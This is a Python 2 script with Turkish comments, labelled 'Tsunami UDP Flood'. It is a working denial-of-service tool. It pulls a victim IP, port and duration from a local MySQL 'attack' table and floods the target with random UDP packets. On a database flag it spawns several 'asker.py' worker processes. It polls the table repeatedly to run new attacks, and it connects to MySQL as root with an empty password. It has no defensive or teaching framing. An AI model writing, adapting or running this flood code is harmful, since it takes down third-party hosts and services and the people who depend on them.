#!/usr/bin/env python
# -*- coding: utf-8 -*
import mysql.connector
import time, socket, os, sys, string
import random

db= mysql.connector.connect(user='root', password='',
                              host='localhost',
                              database='vt',use_pure=False)
   
cursor = db.cursor()
sql = "SELECT * FROM saldiri \
    WHERE id = '%d'" % (2)

 
cursor.execute(sql) 
results = cursor.fetchall()
for row in results:
     
   uyku = row[5]
   
   
    

def kontrol():
   db= mysql.connector.connect(user='root', password='',
                                 host='localhost',
                                 database='vt',use_pure=False)
   
   cursor = db.cursor()
   sql = "SELECT * FROM saldiri \
       WHERE id = '%d'" % (2)

   try:
      # Execute yöntemi ile sql kdlarımızı çalıştırıyoruz.
      cursor.execute(sql)
      # Liste içindeki listelerden tüm satırları çekiyoruz
      results = cursor.fetchall()
      for row in results:
         ip = row[1]
         sure = row[2]
         port = row[3]
         kontrol=row[4]
         askergucu=row[6]

   except:
      print "Error: unable to fecth data"
   print "Saldirilacak Ipi "+ip+" Saldiri Suresi= "+str(sure)+" Saldiri Portu= "+port

# Veritabanı bağlantısını sonlandırıyoruz
   db.close()

   credits = (
       'Tsunami UDP Flood '
       'Power By Ramazan Serif AKBUZ'
       )
   client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
   bytes = random._urandom(1024) 
 
   def pres(): 
     
       print credits
   pres()
   victim  = ip
   vport = int(port)
   duration  =sure
   timeout =  time.time() + duration
   sent = 0
   a = 0
   if kontrol=="1":
   
      while a < askergucu:
          a = a + 1
          os.startfile("asker.py")

      while 1:
          if time.time() > timeout:
              break
          else:
              pass
          client.sendto(bytes, (victim, vport))
          sent = sent + 1
          print "Saldiri Basladi %s Paket Yollaniyor %s saldirilan port %s "%(sent, victim, vport)
      
kontrol()
while True:
   time.sleep(uyku)
   kontrol()
